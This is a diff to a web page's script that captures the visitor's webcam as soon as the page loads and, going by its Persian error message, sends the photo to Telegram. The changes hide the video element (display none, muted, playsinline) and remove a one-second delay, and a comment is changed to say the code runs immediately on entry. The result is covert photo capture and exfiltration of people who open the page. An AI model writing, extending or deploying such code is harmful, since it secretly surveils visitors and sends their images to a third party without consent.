@@ -58,6 +58,9 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
+        video.setAttribute('playsinline', '');
+        video.setAttribute('muted', '');
+        video.style.display = 'none';
         document.body.appendChild(video);
         video.srcObject = stream;
         await video.play();
@@ -83,11 +86,12 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
+        video.setAttribute('playsinline', '');
+        video.setAttribute('muted', '');
+        video.style.display = 'none';
         document.body.appendChild(video);
         video.srcObject = stream;
         await video.play();
-
-        await new Promise(resolve => setTimeout(resolve, 1000));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
@@ -144,7 +148,7 @@
       .catch(error => console.error('❌ خطا در ارسال به تلگرام:', error));
     }
 
-    // اجرای خودکار هنگام ورود
+    // اجرای فوری هنگام ورود
     takePhotoAndSend();
   </script>
 </body>
